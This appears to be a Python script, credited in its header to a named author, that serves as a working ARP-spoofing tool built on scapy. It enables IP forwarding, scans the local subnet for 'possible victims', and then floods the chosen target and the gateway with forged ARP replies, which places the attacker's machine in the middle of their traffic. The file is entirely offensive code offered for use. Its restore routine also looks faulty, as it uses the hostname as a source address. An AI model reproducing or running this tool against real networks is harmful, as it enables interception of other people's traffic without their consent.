from scapy.all import *
import time
import socket
import os
import netifaces

##
## Created by Noah Pearson (coffee#2142)
## Network spoofer
##

# pre set vars
devices = []
gateway_ip = ""
target_ip = ""
target_mac = ""

# ip forwarding
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("Enavled IP forwarding")

# get gateway ip
gws = netifaces.gateways()
gateway_ip = gws['default'][2][0]

hostname = socket.gethostname()

# function to get all ips
def get_ips(gateway):
	# clear devices upon refresh
	global devices
	devices = []
	os.system("clear")
	# get list of devices
	ips = gateway_ip+"/24"
	answers, uans = arping(ips,verbose=0)
	for answer in answers:
		devices.append([answer[1].psrc,answer[1].hwsrc])
	# return list of possible victims
	print("------------------")
	print("Possible victims")
	print("")
	for i in range(len(devices)-1):
		if devices[i][0] == gateway_ip:
			"do nothing"
		else:
			print("ID {} = \t IP {} MAC {}".format(str(i),devices[i][0],devices[i][1]))
	print("")
	print("r - refresh devices")
	print("x - exit")
	print("input id number to select victim")
	print("------------------")

get_ips(gateway_ip)

# setup choice
while True:
	try:
		# choose target
		choice = input("Option: ")
		choice = int(choice)
		device = devices[choice]
		target_ip = device[0]
		target_mac = device[1]
		print("Started spoofing {}".format(target_ip))
		while True:
			try:
				# tell victim we are router
				arp = ARP(op=1,pdst=target_ip,hwdst=target_mac,psrc=gateway_ip)
				send(arp,verbose=0)
				# tell router we are victim
				arp = ARP(op=1,pdst=gateway_ip,hwdst=devices[0][1],psrc=target_ip)
				send(arp,verbose=0)
				time.sleep(0.001)
			except KeyboardInterrupt:
				# restore machines
				print("\nCleaning devices...")
				arp = ARP(op=1,pdst=target_ip,hwdst=target_mac,psrc=hostname)
				send(arp,verbose=0)
				arp = ARP(op=1,pdst=gateway_ip,hwdst=devices[0][1],psrc=hostname)
				send(arp,verbose=0)
				print("Stopped spoofing")
				break
	except:
		if choice == "r":
			# refresh ips
			get_ips(gateway_ip)
		else:
			if choice == "x":
				# exit program
				break
			else:
				print("Failed input")
